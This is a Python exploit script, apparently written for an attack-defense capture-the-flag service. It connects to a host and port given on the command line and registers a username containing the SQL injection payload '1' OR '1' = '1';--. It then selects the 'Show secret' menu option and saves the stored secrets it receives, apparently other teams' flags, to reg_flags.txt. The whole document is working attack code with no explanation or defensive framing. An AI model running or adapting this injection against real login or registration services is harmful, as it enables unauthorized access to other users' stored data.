import socket
import sys

if __name__ == '__main__':
    address = sys.argv[1]
    port = int(sys.argv[2])
    sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    sock.connect((address, port))
    data = sock.recv(1024)
    sock.send(b"1\n")
    data = sock.recv(1024)
    sock.send(b"1' OR '1' = '1';--\n")
    data = sock.recv(1024)
    if data.decode("utf-8") == "Username alredy exists\n":
        print("Change user name.\n")
        sys.exit()
    sock.send(b"12345\n")
    data = sock.recv(1024)
    sock.send(b"1\n")
    fulldata = ""
    data = ""
    while True:        
        data = sock.recv(1024)
        data = data.decode("utf-8")
        fulldata = fulldata + data
        if "Commands.\n1.Show secret\n2.Store secret\n3.Show users\n4.Exit\n>" in data:
            break
    sock.send(b"4\n")
    sock.close()
    fulldata = fulldata[:len(fulldata) - len("Commands.\n1.Show secret\n2.Store secret\n3.Show users\n4.Exit\n>")]
    print(fulldata)
    flags = fulldata.split("\n")
    print(flags)
    while "No secret." in flags:
        flags.remove("No secret.")
    with open(r'reg_flags.txt', 'w') as fp:
        for flag in flags:
            fp.write("%s\n" % flag)

